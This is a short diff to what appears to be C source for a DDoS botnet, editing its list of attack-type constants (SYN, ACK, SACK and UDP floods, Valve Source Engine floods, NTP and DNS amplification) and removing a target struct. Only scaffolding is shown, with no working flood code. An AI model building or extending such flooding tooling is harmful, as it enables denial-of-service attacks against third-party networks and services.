@@ -28,21 +28,14 @@ static inline unsigned short csum(unsigned short *ptr, int nbytes) {
 }
 
 // Attack Vectors
-#define ATK_UDP_VSE    1  // Valve Source Engine
-#define ATK_TCP_SOCKET 2  // Socket Bypass (3-way handshake)
-#define ATK_TCP_SACK   3  // Advanced SACK Flood
-#define ATK_TCP_WRA    4  // Window Randomization
-#define ATK_UDP_PLAIN  5  // Generic UDP Flood (PPS/Volumetric)
-#define ATK_TCP_SYN    6  // SYN Flood
-#define ATK_TCP_ACK    7  // ACK Flood
-#define ATK_NTP_AMP    8  // NTP Amplification
-#define ATK_DNS_AMP    9  // DNS Amplification
-
-struct attack_target {
-    struct sockaddr_in dest_addr;
-    uint32_t duration;
-    uint8_t flags;
-};
+#define ATK_UDP_VSE    1
+#define ATK_TCP_SOCKET 2
+#define ATK_TCP_SACK   3
+#define ATK_UDP_PLAIN  5
+#define ATK_TCP_SYN    6
+#define ATK_TCP_ACK    7
+#define ATK_NTP_AMP    8
+#define ATK_DNS_AMP    9
 
 // Prototypes
 void attack_init(void);
